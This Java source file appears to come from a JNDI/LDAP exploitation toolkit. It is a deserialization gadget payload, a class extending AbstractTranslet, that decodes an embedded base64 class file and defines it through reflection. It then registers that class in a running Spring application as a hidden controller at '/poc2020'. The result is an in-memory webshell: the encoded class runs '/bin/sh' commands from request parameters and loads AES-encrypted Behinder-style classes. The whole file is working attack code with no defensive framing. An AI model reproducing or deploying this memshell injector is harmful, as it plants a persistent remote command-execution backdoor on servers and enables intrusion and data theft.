package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.support.XmlWebApplicationContext;
import sun.misc.BASE64Decoder;
import java.lang.reflect.Method;
import java.util.Set;

public class SpringMemshellTemplate extends AbstractTranslet {
    public SpringMemshellTemplate(){
        System.out.println("[+] Add Dynamic Controller");

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Class clazz = null;
        try{
            clazz = classLoader.loadClass("com.memshell.generic.DynamicControllerTemplate");
        }catch(ClassNotFoundException e){
            try{
                BASE64Decoder base64Decoder = new BASE64Decoder();
                String codeClass = "yv66vgAAADIBUQoAPgCbCgBYAJwJAJ0AnggAnwoAoAChCACiCwCjAKQIAKUKAA4ApgoApwCoCgAOAKkJAKoAqwgArAcArQgArggArwgAaAgAsAcAsQoAsgCzCgCyALQKALUAtgoAEwC3CAC4CgATALkKABMAugsAuwC8CgC9AKEKAKcAvgsAowC/CwCjAMAIAMEKAKcAwgsAowDDCADECwDFAMYIAMcKAMgAyQcAygcAywoAKACbCwDFAMwKACgAzQgAzgoAKADPCgAoANAKAA4A0QoAJwDSCgDIANMHANQKADIAmwsAowDVCgDWANcKADIA2AoAyADZCQBYANoIANsHANwHAG0HAN0KADoA3gcA3woA4ADhCgDgAOIKAOMA5AoAOgDlCADmBwDnBwDoBwDpCgBGAOoIAOsKADwA7AcA7QoAPgDuCQDvAPAHAPEKADoA8ggA8woA4wD0CgDvAPUHAPYKAFIA6gcA9woAVADqBwD4CgBWAOoHAPkBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAwTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNDb250cm9sbGVyVGVtcGxhdGU7AQAFbG9naW4BAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAFrAQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAJbQgEACWV2aWxDbGFzcwEACmV2aWxPYmplY3QBABJMamF2YS9sYW5nL09iamVjdDsBAAx0YXJnZXRNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcArQcAZQcA6QEACkV4Y2VwdGlvbnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEACC9wb2MyMDIwAQAKaW5pdGlhbGl6ZQEAAmV4AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAFY2xhenoBAAZtZXRob2QBAARjb2RlAQAFYnl0ZXMBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAPkHAN0HAO0HANwHAPoHAPEHAPYHAPcHAPgBAApTb3VyY2VGaWxlAQAeRHluYW1pY0NvbnRyb2xsZXJUZW1wbGF0ZS5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAWwBcDACCAFwHAPsMAPwA/QEAIVsrXSBEeW5hbWljIENvbnRyb2xsZXIgc2F5cyBoZWxsbwcA/gwA/wEAAQAEdHlwZQcBAQwBAgEDAQAFYmFzaWMMAOYBBAcBBQwBBgEHDAEIAQkHAQoMAQsAZwEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcBDAwBDQEODAEPARAHAREMARIBEwwAWwEUAQACXEEMARUBFgwBFwEHBwEYDAEZARoHARsMARwBBwwBHAEDDAEdAQcBAARQT1NUDAEeAQcMAR8BIAEAAXUHASEMASIBIwEAA0FFUwcBJAwBJQEmAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEnASgMASkBKgEAAAwBKQErDAEsAQcMAS0BLgwAWwEvDAEwATEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEyATMHATQMATUBBwwBNgE3DAE4ATkMAFkAWgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAE6ATsBABBqYXZhL2xhbmcvT2JqZWN0BwE8DAE9AT4MAT8BQAcA+gwBQQFCDAFDAUQBAAZlcXVhbHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFFAFwBACJjb20ubWVtc2hlbGwuZ2VuZXJpYy5NeUNsYXNzTG9hZGVyDAFGAUcBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgwBSAFJBwFKDAFLAFoBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDAFMAUkBAxB5djY2dmdBQUFESUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDUk1ZMjl0TDIxbGJYTm9aV3hzTDJkbGJtVnlhV012VFhsRGJHRnpjMHh2WVdSbGNqc0JBQUZqQVFBWFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUF0a1pXWnBibVZEYkdGemN3RUFMQ2hiUWt4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFGWW5sMFpYTUJBQUpiUWdFQUMyTnNZWE56VEc5aFpHVnlBUUFLVTI5MWNtTmxSbWxzWlFFQUVrMTVRMnhoYzNOTWIyRmtaWEl1YW1GMllRd0FCZ0FIQVFBaVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2d3QUR3QWFBUUFWYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeUFRQVhLRnRDU1VrcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQUlRQUNBQVVBQUFBQUFBSUFBQUFHQUFjQUFRQUlBQUFBT2dBQ0FBSUFBQUFHS2l1M0FBR3hBQUFBQWdBSkFBQUFCZ0FCQUFBQUJBQUtBQUFBRmdBQ0FBQUFCZ0FMQUF3QUFBQUFBQVlBRFFBT0FBRUFDUUFQQUJBQUFRQUlBQUFBUkFBRUFBSUFBQUFRdXdBQ1dTdTNBQU1xQXlxK3RnQUVzQUFBQUFJQUNRQUFBQVlBQVFBQUFBZ0FDZ0FBQUJZQUFnQUFBQkFBRVFBU0FBQUFBQUFRQUJNQURnQUJBQUVBRkFBQUFBSUFGUT09DAFNAU4MAU8BUAEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24BAC5jb20vbWVtc2hlbGwvZ2VuZXJpYy9EeW5hbWljQ29udHJvbGxlclRlbXBsYXRlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAbY29tL21lbXNoZWxsL2dlbmVyaWMvQ29uZmlnAQALZ2V0UGFzc3dvcmQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2lzRW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEAFmdldEJlaGluZGVyU2hlbGxQd2RQd2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwAhAFgAPgAAAAEAAgBZAFoAAAADAAEAWwBcAAEAXQAAADsAAQABAAAACSq3AAEqtwACsQAAAAIAXgAAAA4AAwAAABYABAAXAAgAGABfAAAADAABAAAACQBgAGEAAAABAGIAYwADAF0AAAKuAAcACQAAAYayAAMSBLYABSsSBrkABwIAxgCLKxIGuQAHAgASCLYACZkAeyu4AAq5AAcCAE4txgBqLbYAC5oAYwE6BLIADBINtgAJmQAaBr0ADlkDEg9TWQQSEFNZBS1TOgSnABcGvQAOWQMSEVNZBBISU1kFLVM6BLsAE1m4ABQZBLYAFbYAFrcAFxIYtgAZtgAaOgUsuQAbAQAZBbYAHKcA7Su4AB25AB4CAMYA4Su5AB8BABIgtgAJmQDLuAAhTiu5ACIBABIjLbkAJAMAEiW4ACY6BBkEBbsAJ1m7AChZtwApK7kAIgEAEiO5ACoCALYAKxIstgAttgAutgAvEiW3ADC2ADEZBLsAMlm3ADMruQA0AQC2ADW2ADa2ADc6BSq0ADgSOQW9ADpZAxI7U1kEEjxTtgA9AQW9AD5ZAxkFU1kEuAA/tgBAU7YAQcAAOjoGGQa2AEI6BxkGEkMFvQA6WQMSRFNZBBJFU7YAPToIGQgZBwW9AD5ZAytTWQQsU7YAQVenAAhOLbYAR7EAAQCnAX0BgABGAAMAXgAAAGYAGQAAABwACAAeACMAIAAtACEAOAAiADsAIwBGACQAXQAmAHEAKACNACkAmAArAKcALgC1AC8AuQAwAMcAMQDOADIA/wAzARkANAFLADUBUgA2AWkANwF9ADsBgAA5AYEAOgGFAD0AXwAAAIQADQA7AF0AZABlAAQAjQALAGYAZwAFAC0AawBoAGcAAwC5AMQAaQBnAAMAzgCvAGoAawAEARkAZABsAG0ABQFLADIAbgBaAAYBUgArAG8AcAAHAWkAFABxAHIACAGBAAQAcwB0AAMAAAGGAGAAYQAAAAABhgB1AHYAAQAAAYYAdwB4AAIAeQAAABgAB/0AXQcAegcAexP5ACYC+wDhQgcAfAQAfQAAAAQAAQBUAH4AAAAOAAEAfwABAIBbAAFzAIEAAgCCAFwAAQBdAAACAwAHAAcAAACpuAA/tgBATCorEki2AEm1ADinAH9NK7YAS04BOgQZBMcAMy0SPqUALS0SOQa9ADpZAxI7U1kEsgBMU1kFsgBMU7YAPToEp//YOgUttgBOTqf/zhJPOgW7ADJZtwAzGQW2ADY6BhkEBLYAUCoZBCsGvQA+WQMZBlNZBAO4AFFTWQUZBr64AFFTtgBBwAA6tQA4pwAYTCu2AFOnABBMK7YAVacACEwrtgBXsQAFAAcAEQAUAEoAKABFAEgATQAAAJAAkwBSAAAAkACbAFQAAACQAKMAVgADAF4AAABqABoAAABBAAcAQwARAFMAFABEABUARQAaAEYAHQBHACgASQBFAEwASABKAEoASwBPAEwAUgBPAFYAUABkAFEAagBSAJAAWgCTAFQAlABVAJgAWgCbAFYAnABXAKAAWgCjAFgApABZAKgAWwBfAAAAcAALAEoABQCDAIQABQAaAHYAhQBaAAMAHQBzAIYAcgAEAFYAOgCHAGcABQBkACwAiABtAAYAFQB7AHMAiQACAAcAiQCKAIsAAQCUAAQAcwCMAAEAnAAEAHMAjQABAKQABABzAI4AAQAAAKkAYABhAAAAeQAAADoACf8AFAACBwCPBwCQAAEHAJH+AAgHAJEHAJIHAJNqBwCUCf8APQABBwCPAABCBwCVRwcAlkcHAJcEAAIAmAAAAAIAmQB+AAAABgABAJoAAA==";
                byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                Method method = null;
                Class clz = classLoader.getClass();
                while(method == null && clz != Object.class ){
                    try{
                        method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    }catch(NoSuchMethodException ex){
                        clz = clz.getSuperclass();
                    }
                }
                method.setAccessible(true);
                clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
            }catch (Exception ex){
                //continue;
            }
        }

        XmlWebApplicationContext context = null;
        try{
            context = (XmlWebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        }catch(Exception e){
            context = (XmlWebApplicationContext) ContextLoader.getCurrentWebApplicationContext();
        }

        try{
            // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
            context.getBeanFactory().registerSingleton("dynamicController", clazz.newInstance());
        }catch(Exception e){
            System.out.println(e);
            //continue
        }


        try{
            Object requestMappingHandlerMapping = context.getBean(Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
            // 防止重复添加，重复添加会导致不可用
            Object obj = requestMappingHandlerMapping.getClass().getMethod("getHandlerMethods").invoke(requestMappingHandlerMapping);
            Method method = obj.getClass().getMethod("keySet");
            method.setAccessible(true);
            Set mappingInfos = (Set)method.invoke(obj);
            for(Object requestMappingInfo : mappingInfos){
                if(requestMappingInfo.toString().contains("/poc2020")){
                    return;
                }
            }
            method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("detectHandlerMethods", Object.class);
            method.setAccessible(true);
            method.invoke(requestMappingHandlerMapping, "dynamicController");
            return;
        }catch(Exception e){
            System.out.println(e);
            //continue;
        }

        try{
            // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
            Object dh = context.getBean(Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping"));
            // 3. 反射获得 registerHandler Method
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping").getDeclaredMethod("registerHandler", String.class, Object.class);
            method.setAccessible(true);
            // 4. 将 dynamicController 和 URL 注册到 handlerMap 中
            method.invoke(dh, "/poc2020", "dynamicController");
            return;
        }catch(Exception e){
            System.out.println(e);
            //continue
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
